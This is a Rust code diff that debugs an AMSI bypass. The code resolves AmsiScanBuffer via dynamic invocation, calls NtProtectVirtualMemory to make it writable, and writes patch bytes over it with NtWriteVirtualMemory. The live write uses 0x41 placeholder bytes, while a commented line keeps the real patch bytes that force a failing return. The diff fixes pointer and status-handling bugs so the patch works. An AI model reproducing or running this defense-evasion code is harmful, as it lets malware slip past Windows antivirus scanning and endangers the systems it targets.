@@ -77,43 +77,50 @@ fn amsi_patch() {
     }
 
     let amsi_scan_buffer: isize = dinvoke::get_function_address(amsi_addr, "AmsiScanBuffer");
-    println!("[+] AmsiScanBuffer Address located at: {:?}", amsi_scan_buffer);
 
+    println!("[+] AmsiScanBuffer Address located at: {:?}", amsi_scan_buffer as *mut c_void);
     breakpoint();
 
     let ntdll: isize = dinvoke::get_module_base_address("ntdll.dll");
     if ntdll != 0 {
         unsafe {
             let mut ret: Option<i32>;
-            let ptr_nt_protect_virtual_memory: unsafe extern "system" fn (HANDLE, *mut c_void, *mut usize, u32, *mut u32) -> i32;
+            let ptr_nt_protect_virtual_memory: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
             let current_process: HANDLE = GetCurrentProcess();
-            let base_addr: *mut c_void = amsi_scan_buffer as *mut c_void;
+            let mut base_addr: *mut c_void = amsi_scan_buffer as *mut c_void;
             println!("Base addr: {:?}", base_addr);
-            let bytes_protect_num: *mut usize = 6 as *mut usize;
+            let mut bytes_protect_num: usize = 6;
             let page_readwrite: u32 = 0x04;
             let mut old_protect: u32 = 0;
             println!("[+] Calling NtProtectVirtualMemory");
-            dinvoke::dynamic_invoke!(ntdll, "NtProtectVirtualMemory", ptr_nt_protect_virtual_memory, ret, current_process, base_addr, bytes_protect_num, page_readwrite, &mut old_protect);
-            println!("result: {:?}", ret);
+            dinvoke::dynamic_invoke!(ntdll, "NtProtectVirtualMemory", ptr_nt_protect_virtual_memory, ret, current_process, &mut base_addr, &mut bytes_protect_num, page_readwrite, &mut old_protect);
+            let mut status = ret.unwrap() as u32;
+            println!("result: {:?}", status);
             println!("old protect: {:?}", old_protect);
             breakpoint();
 
-            if ret.is_none() {
-                println!("[!] Error changing mem protections!!");
+            if status != 0 {
+                println!("[!] Error changing mem protections!! {:?}", status);
+                return;
             }
 
             println!("[+] Calling NtWriteVirtualMemory");
+            base_addr = amsi_scan_buffer as *mut c_void;
+            println!("[+] Base Addr {:?}", base_addr);
             //let fix: *mut c_void = vec![0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3].as_mut_ptr() as *mut c_void;
-            let fix: *mut c_void = vec![0x41, 0x41, 0x41, 0x41, 0x41, 0x41].as_mut_ptr() as *mut c_void;
-            let bytes_written: *mut usize = ptr::null_mut();
+            let fix = vec![0x41, 0x41, 0x41, 0x41, 0x41, 0x41].as_mut_ptr();
+            let mut bytes_written: usize = 0;
             let ptr_nt_write_virtual_memory: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
-            dinvoke::dynamic_invoke!(ntdll, "NtWriteVirtualMemory", ptr_nt_write_virtual_memory, ret, current_process, base_addr, fix, 6, bytes_written);
-            println!("result: {:?}", ret);
-            println!("bytes written: {:?}", bytes_written);
+           // dinvoke::dynamic_invoke!(ntdll, "NtWriteVirtualMemory", ptr_nt_write_virtual_memory, ret, current_process, base_addr, fix, 6, &mut bytes_written);
+            dinvoke::dynamic_invoke!(ntdll, "NtWriteVirtualMemory", ptr_nt_write_virtual_memory, ret, current_process, base_addr, vec![0x41, 0x41, 0x41, 0x41, 0x41, 0x41].as_ptr() as *mut c_void, 6, &mut bytes_written);
+            status = ret.unwrap() as u32;
+            println!("result: {:?}", status);
+            println!("bytes written: {:?} at {:?}", bytes_written, amsi_scan_buffer as *mut c_void);
             breakpoint();
 
-            if ret.is_none() {
-                println!("[!] Error writing memory!!");
+            if status != 0 {
+                println!("[!] Error writing memory!! {:?}", status);
+                return;
             }
         }
     }
